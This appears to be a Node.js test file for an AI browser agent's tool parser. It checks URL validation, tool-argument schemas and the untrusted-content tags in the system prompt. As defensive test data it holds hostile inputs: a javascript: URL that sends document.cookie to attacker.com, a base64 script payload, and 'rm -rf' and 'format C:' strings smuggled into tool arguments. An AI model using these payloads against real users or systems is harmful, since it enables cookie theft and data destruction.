import test from 'node:test'
import assert from 'node:assert/strict'
import { validateAndSanitizeUrl, validateToolCallSchema } from '../lib/tool-parser'
import { SYSTEM_PROMPT_TEMPLATE } from '../lib/prompts/system-prompt'

test('Security: URL validation blocks cross-protocol and script attacks', () => {
  const attacks = [
    'javascript:document.location="https://attacker.com/steal?"+document.cookie',
    'JAVASCRIPT:alert(1)',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'file:///C:/Windows/System32/calc.exe',
    'chrome://settings/passwords',
    'chrome-extension://someextensionid/manifest.json',
    'about:config'
  ]

  for (const url of attacks) {
    const res = validateAndSanitizeUrl(url)
    assert.equal(res.valid, false, `Vulnerability: ${url} should have been rejected!`)
  }
})

test('Security: URL validation permits only legitimate HTTP and HTTPS URLs', () => {
  const validUrls = [
    'https://www.youtube.com',
    'http://localhost:3000/dashboard?auth=token#section',
    'https://developer.mozilla.org/en-US/docs/Web/API',
    'google.com' // bare domain auto-prepends https://
  ]

  for (const url of validUrls) {
    const res = validateAndSanitizeUrl(url)
    assert.equal(res.valid, true, `Should accept valid URL: ${url}`)
    assert.match(res.url || '', /^https?:\/\//)
  }
})

test('Security: Element index validator blocks non-integers, floats, negative numbers, and injection strings', () => {
  const invalidIndices = [
    -1,
    -999,
    1.5,
    NaN,
    Infinity,
    '3] || true || [',
    '<script>alert(1)</script>',
    '0; rm -rf'
  ]

  for (const idx of invalidIndices) {
    const res = validateToolCallSchema('clickElement', { index: idx })
    assert.equal(res.valid, false, `Should reject invalid index: ${idx}`)
  }
})

test('Security: System prompt strictly segregates untrusted webpage content', () => {
  // Ensure trust boundaries are present in the prompt template
  assert.ok(SYSTEM_PROMPT_TEMPLATE.includes('<untrusted_page_context>'), 'Must enclose page context in untrusted tags')
  assert.ok(SYSTEM_PROMPT_TEMPLATE.includes('</untrusted_page_context>'))
  assert.ok(SYSTEM_PROMPT_TEMPLATE.includes('<untrusted_page_elements>'), 'Must enclose page elements in untrusted tags')
  assert.ok(SYSTEM_PROMPT_TEMPLATE.includes('</untrusted_page_elements>'))
  assert.ok(SYSTEM_PROMPT_TEMPLATE.includes('SECURITY NOTICE'), 'Must have explicit prompt injection instruction warning')
})

test('Security: Schema validator disallows arbitrary or sensitive parameter injections', () => {
  // Rejects unexpected/unmodeled parameters strictly instead of silently discarding them
  const openTabCall = validateToolCallSchema('openTab', {
    url: 'https://youtube.com',
    command: 'format C:'
  })

  assert.equal(openTabCall.valid, false, 'Calls with unexpected unmodeled parameters must be rejected')
  assert.match(openTabCall.error || '', /Unexpected parameter "command"/i)

  // Valid calls with only registered schema parameters pass cleanly
  const validCall = validateToolCallSchema('openTab', {
    url: 'https://youtube.com',
    tabName: 'YouTube'
  })
  assert.equal(validCall.valid, true)
  assert.equal(validCall.toolCall?.arguments.url, 'https://youtube.com')
})
